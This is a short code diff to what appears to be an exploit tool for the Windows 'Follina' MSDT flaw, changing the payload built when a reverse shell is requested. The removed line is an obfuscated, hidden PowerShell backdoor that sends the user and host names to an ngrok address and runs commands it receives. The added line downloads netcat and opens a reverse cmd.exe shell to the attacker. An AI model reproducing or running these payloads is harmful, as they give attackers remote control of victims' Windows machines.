@@ -108,7 +108,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Start-Process $PSHOME\powershell.exe -ArgumentList { for (;;) { try {$i='3b70e0-7'+'74'+'bd4-812edc';$u=$env:USERNAME;$h=$env:COMPUTERNAME;$o='windows';$p='ht'+'tp://';$s='0'+'.tc'+'p.ap'+'.ngrok'+'.'+'io:15018'+''+''+'';$f=(15 -as [char])+(15 -as [char])+(255 -as [char]);$b=$f;$r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content;if ($r -ne 'None') {try { $b = (i''e''x $r 2>&1 | Out-String ); } catch {  $b = $_   } $r=(iwr $p$s/$i/$u/$h/$o -UseBasicParsing -Method Post -Body $b).Content}Sle''ep 3} catch {Sle''ep 14}} } -WindowStyle Hidden"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
